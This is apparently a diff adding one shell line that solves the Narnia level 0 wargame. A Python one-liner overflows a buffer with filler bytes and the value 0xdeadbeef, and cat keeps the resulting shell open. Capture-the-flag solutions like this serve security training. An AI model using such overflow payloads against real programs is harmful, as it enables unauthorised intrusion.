@@ -1,0 +1,2 @@
+(python -c "print 'B'*20+'\xef\xbe\xad\xde'";cat) | ./narnia0
+
